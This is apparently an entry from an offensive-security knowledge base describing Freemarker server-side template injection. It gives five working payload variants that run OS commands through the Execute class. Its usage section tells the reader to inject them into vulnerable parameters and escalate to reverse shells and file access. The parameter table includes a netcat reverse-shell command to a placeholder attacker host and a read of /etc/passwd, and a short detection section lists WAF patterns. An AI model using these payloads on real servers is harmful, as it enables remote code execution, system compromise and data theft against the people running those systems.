---
id: 4b202dec-9cac-490f-b9b7-33fba1e4cf0e
name: Freemarker-Execute-Class-Payload
type: code
language: js
verified: true
created_at: '2023-04-06T03:56:39.051144+00:00'
updated_at: '2023-04-10T20:23:36.379942+00:00'
platforms:
  - Web
  - Java
tags:
  - ssti
  - freemarker
  - rce
  - payload
validated: true
---

# Freemarker-Execute-Class-Payload

## Code

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${ "freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

## Description

This code snippet contains multiple variations of a Freemarker SSTI payload that instantiates the 'freemarker.template.utility.Execute' class to execute arbitrary OS commands. The 'id' placeholder should be replaced with the desired command (e.g., 'whoami', 'cat /etc/passwd'). These variations help bypass basic filters or whitespace restrictions in different application configurations.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| id | The system command to execute | id, whoami, nc -e /bin/sh $ATTACKER_IP $ATTACKER_PORT |

## Usage

Inject this payload into a vulnerable Freemarker-processed parameter (e.g., via POST data or query string) in a web request. Use tools like curl or Burp Suite to send it. For example, in a POST body: 'id=<payload>'. Start with a simple command like 'id' to verify execution, then escalate to reverse shells or file access. This is typically used after confirming SSTI with a test like '${7*7}'.

## Detection

- WAF rules matching Freemarker patterns: '<#assign', '?new()', 'Execute'.
- Application logs showing template evaluation errors or unusual class instantiations.
- Server-side command execution logs (e.g., process creation for 'id' or 'whoami').
- Network anomalies if commands involve outbound connections (e.g., DNS exfil).

## Related

- [[procedures/Freemarker-Server-Side-Template-Injection-for-Code-Execution]]
- [[commands/curl-freemarker-ssti-payload]]
